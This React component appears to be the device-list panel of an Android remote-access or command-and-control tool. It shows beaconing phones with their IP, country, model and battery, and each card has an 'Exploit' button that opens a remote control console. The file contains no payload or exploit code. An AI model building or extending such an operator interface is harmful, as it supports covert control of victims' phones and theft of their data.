
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
  CardDescription,
} from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Badge } from '@/components/ui/badge'
import { Smartphone, Crosshair, Search, BatteryFull } from 'lucide-react'
import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { useAppSelector } from '@/store/hooks'
import { flagFromCountry, deviceIcon } from '@/lib/format'

export function ClientsPanel() {
  const navigate = useNavigate()
  const clients = useAppSelector((s) => s.clients.items)
  const [query, setQuery] = useState('')

  // Navigate to the device's full-page exploit console.
  const openDevice = (id: string) => {
    navigate(`/device/${encodeURIComponent(id)}`)
  }

  const filtered = clients.filter((c) =>
    (c.id + ' ' + (c.details.model ?? '') + ' ' + (c.details.man ?? ''))
      .toLowerCase()
      .includes(query.toLowerCase()),
  )

  return (
    <div className="space-y-6">
      <div className="flex items-end justify-between gap-4 flex-wrap">
        <div>
          <h1 className="text-2xl font-semibold tracking-tight text-zinc-50">
            Connected Devices
          </h1>
          <p className="text-sm text-zinc-500">
            {clients.length} device{clients.length !== 1 ? 's' : ''} currently
            online and reachable.
          </p>
        </div>
        <div className="relative w-full sm:w-72">
          <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 h-4 w-4 text-zinc-500" />
          <Input
            value={query}
            onChange={(e) => setQuery(e.target.value)}
            placeholder="Filter by id, model, vendor…"
            className="pl-8 bg-black/40 border-white/10"
          />
        </div>
      </div>

      <Card className="bg-zinc-900/60 border-white/10">
        <CardHeader>
          <CardTitle className="flex items-center gap-2 text-zinc-100">
            <Smartphone className="h-4 w-4 text-emerald-400" /> Devices
          </CardTitle>
          <CardDescription>
            Tap <span className="text-emerald-400">Exploit</span> to open the
            remote control console for a device.
          </CardDescription>
        </CardHeader>
        <CardContent>
          {filtered.length === 0 ? (
            <div className="py-16 text-center">
              <div className="mx-auto grid h-12 w-12 place-items-center rounded-xl bg-zinc-900 ring-1 ring-white/10">
                <Smartphone className="h-6 w-6 text-zinc-600" />
              </div>
              <p className="mt-3 text-sm text-zinc-500">
                No devices connected. Start a listener and wait for a beacon.
              </p>
            </div>
          ) : (
            <div className="grid gap-3 md:grid-cols-2 xl:grid-cols-3">
              {filtered.map((c) => (
                <div
                  key={c.id}
                  onClick={() => openDevice(c.id)}
                  role="button"
                  tabIndex={0}
                  onKeyDown={(e) => {
                    if (e.key === 'Enter' || e.key === ' ') {
                      e.preventDefault()
                      openDevice(c.id)
                    }
                  }}
                  className="group relative cursor-pointer rounded-xl border border-white/10 bg-zinc-950/60 p-4 transition-all hover:border-emerald-500/30 hover:bg-emerald-500/[0.03]"
                >
                  <div className="flex items-start gap-3">
                    <div className="grid h-10 w-10 shrink-0 place-items-center rounded-lg bg-emerald-500/10 ring-1 ring-emerald-500/20 text-lg">
                      {deviceIcon(c.details.man)}
                    </div>
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center gap-2">
                        <span className="truncate font-mono text-sm text-zinc-100">
                          {c.details.model || c.id}
                        </span>
                        <span className="inline-flex h-1.5 w-1.5 rounded-full bg-emerald-400 pulse-emerald" />
                      </div>
                      <div className="mt-0.5 truncate text-[11px] text-zinc-500 font-mono">
                        {c.id}
                      </div>
                    </div>
                  </div>

                  <div className="mt-3 grid grid-cols-2 gap-y-1.5 text-xs">
                    <Field
                      label="Vendor"
                      value={c.details.man || '—'}
                    />
                    <Field
                      label="Android"
                      value={c.details.release || '—'}
                    />
                    <Field
                      label="Country"
                      value={
                        <span className="inline-flex items-center gap-1">
                          <span>{flagFromCountry(c.details.country)}</span>
                          {c.details.country || 'Unknown'}
                        </span>
                      }
                    />
                    <Field
                      label="IP"
                      value={c.details.ip || '—'}
                      mono
                    />
                  </div>

                  {typeof c.details.battery === 'number' && (
                    <div className="mt-2 flex items-center gap-1.5 text-[11px] text-zinc-500">
                      <BatteryFull className="h-3.5 w-3.5 text-emerald-400/80" />
                      {c.details.battery}% battery
                    </div>
                  )}

                  <Button
                    onClick={(e) => {
                      e.stopPropagation()
                      openDevice(c.id)
                    }}
                    className="mt-4 w-full bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950 font-semibold"
                  >
                    <Crosshair className="h-4 w-4" /> Exploit
                  </Button>
                </div>
              ))}
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  )
}

function Field({
  label,
  value,
  mono,
}: {
  label: string
  value: React.ReactNode
  mono?: boolean
}) {
  return (
    <div>
      <div className="text-[10px] uppercase tracking-wider text-zinc-600">
        {label}
      </div>
      <div
        className={`text-zinc-300 ${mono ? 'font-mono text-[11px]' : ''}`}
      >
        {value}
      </div>
    </div>
  )
}
